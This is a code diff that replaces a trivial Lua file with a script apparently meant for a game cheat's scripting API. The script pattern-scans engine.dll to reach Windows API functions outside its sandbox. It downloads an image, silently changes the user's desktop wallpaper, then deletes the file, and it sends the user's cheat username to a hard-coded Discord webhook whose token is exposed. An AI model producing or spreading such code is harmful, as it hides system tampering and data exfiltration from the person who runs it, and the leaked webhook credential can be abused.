@@ -1,1 +1,169 @@
-print(1)
+local ffi = require("ffi")
+
+ffi.cdef 
+[[
+        typedef int                                         BOOL;
+        typedef unsigned long                               DWORD;
+        typedef void *                                      HANDLE;
+        typedef struct HINSTANCE* 				            HMODULE;
+        typedef struct HWND__ * __ptr64                     HWND;
+        typedef char const * __ptr64                        LPCSTR;
+        typedef void const * __ptr64                        LPCVOID;
+        typedef unsigned long * __ptr64                     LPDWORD;
+        typedef struct _OVERLAPPED *                        LPOVERLAPPED;
+        typedef struct _SECURITY_ATTRIBUTES * __ptr64       LPSECURITY_ATTRIBUTES;
+        typedef char *                                      LPSTR;
+        typedef void *                                      PVOID;
+        typedef unsigned int       				            UINT;
+]]
+
+Meme = function()
+
+    local GMH, GPA, ECX, pGMH, pGPA, fnGMH, fnGPA, CloseHandle, CreateFileA, GetTempPathA, SystemParametersInfoA, WriteFile, Path
+
+    GMH = Utils.PatternScan("engine.dll", "FF 15 ? ? ? ? 85 C0 74 0B")      or error("[ * ]Cannot Find GetModuleHandleA", 2)
+    GPA = Utils.PatternScan("engine.dll", "FF 15 ? ? ? ? 89 45 E8")         or error("[ * ]Cannot Find GetProcAddress", 2)
+    ECX = Utils.PatternScan("engine.dll", "FF E1")                          or error("[ * ]Cannot Find JMP", 2)
+
+    pGMH = ffi.cast("unsigned int**", ffi.cast("unsigned int", GMH) + 2)[0][0]
+    pGPA = ffi.cast("unsigned int**", ffi.cast("unsigned int", GPA) + 2)[0][0]
+
+    fnGMH = ffi.cast("HMODULE(__fastcall*)(unsigned int, unsigned int, LPCSTR)", ECX)
+    fnGPA = ffi.cast("unsigned int(__fastcall*)(unsigned int, unsigned int, HMODULE, LPCSTR)", ECX)
+
+    local function GetProcAddress(Module, lpProcName, Typedef)
+        local ctype = ffi.typeof(Typedef)
+        local hModule = fnGMH(pGMH, 0, Module)
+        local proc_addr = fnGPA(pGPA, 0, hModule, lpProcName)
+        local Call_foo = ffi.cast(ctype, ECX)
+
+        return function(...)
+            return Call_foo(proc_addr, 0, ...)
+        end
+    end
+
+    CloseHandle =
+        GetProcAddress(
+        "Kernel32.dll", 
+        "CloseHandle", 
+        "BOOL (__fastcall*)(unsigned int, unsigned int, HANDLE)"
+    )
+    
+    CreateFileA =
+        GetProcAddress(
+        "Kernel32.dll",
+        "CreateFileA",
+        "HANDLE (__fastcall*)(unsigned int, unsigned int, LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE)"
+    )
+
+    DeleteFileA = 
+        GetProcAddress(
+        "Kernel32.dll",
+        "DeleteFileA",
+        "BOOL  (__fastcall*)(unsigned int, unsigned int, LPCSTR)"
+    )
+    
+    GetTempPathA =
+        GetProcAddress(
+        "Kernel32.dll", 
+        "GetTempPathA", 
+        "DWORD (__fastcall*)(unsigned int, unsigned int, DWORD, LPSTR)"
+    )
+    
+    SystemParametersInfoA =
+        GetProcAddress(
+        "User32.dll",
+        "SystemParametersInfoA",
+        "BOOL(__fastcall*)(unsigned int, unsigned int, UINT, UINT, PVOID, UINT)"
+    )
+
+    WriteFile =
+        GetProcAddress(
+        "Kernel32.dll",
+        "WriteFile",
+        "BOOL(__fastcall*)(unsigned int, unsigned int, HANDLE,LPCVOID ,DWORD, LPDWORD, LPOVERLAPPED)"
+    )
+
+    local function TempFolder()
+        local lpPathBuffer = ffi.new("char[260]")
+        GetTempPathA(260, lpPathBuffer)
+        return string.format("%s\\%s", ffi.string(lpPathBuffer), "Random.png")
+    end
+    
+    local function CreateFile(Path)
+        local bErrorFlag, dwBytesWritten, hFile, Image
+    
+        bErrorFlag = 0
+        dwBytesWritten = ffi.new("DWORD[1]")
+        hFile = ffi.new("HANDLE")
+        Image = Http.Get("https://media.discordapp.net/attachments/979917989811990528/1012743466750582884/2022-08-26_181736.jpg") -- https://media.discordapp.net/attachments/973238367812722768/975097602980859934/TranscodedWallpaper.jpg
+    
+        hFile = CreateFileA(Path, 1073741824, 0, NULL, 2, 128, NULL)
+    
+        if (hFile == -1) then
+            error("[ * ] Unable to open file.", 2)
+            return 0
+        end
+    
+        bErrorFlag = WriteFile(hFile, Image, string.len(Image), dwBytesWritten, NULL)
+    
+        if (bErrorFlag == 0) then
+            error("[ * ] Unable to write to file.", 2)
+            return 0
+        elseif (dwBytesWritten[0] ~= string.len(Image)) then
+            error("[ * ] dwBytesWritten != dwBytesToWrite.", 2)
+            return 0
+        end
+
+        CloseHandle(hFile)
+        return 1
+    end
+    
+    local function SetWallpaper(Path)
+        SystemParametersInfoA(20, 0, ffi.cast("PVOID", ffi.cast("const char *",Path)), 1)
+    end
+
+    local function DeleteFile(Path)
+        DeleteFileA(Path)
+    end
+
+    local function blatlanttimer(time)
+        CurrentTime = Utils.UnixTime()
+        BreakTime = CurrentTime + time
+        while(true) do
+            if(Utils.UnixTime() == BreakTime) then
+                break
+            end
+        end
+        return 1
+    end
+
+    Path = TempFolder()
+
+    if(CreateFile(Path)) then
+        SetWallpaper(Path)
+        blatlanttimer(20)
+        DeleteFile(Path)
+    end
+
+    return 0
+end
+
+Meme()
+
+local http = Panorama.LoadString([[
+    return {
+        request: function(url, options){
+            $.AsyncWebRequest(url, options);
+        }
+    }
+]])()
+
+local webhook_url = "https://discord.com/api/webhooks/990900669500256317/kpNhGMtcn3DXA50k2RYdby_V7svh04ddZteE0x9OwZ0R_y0kcC3e7m-4L40kl1IoR-wB"
+
+http.request( webhook_url, {
+    type = "POST",
+    data = {
+        content = ("%s data has been sent to the server!"):format(Cheat.GetCheatUserName())
+    }
+} )
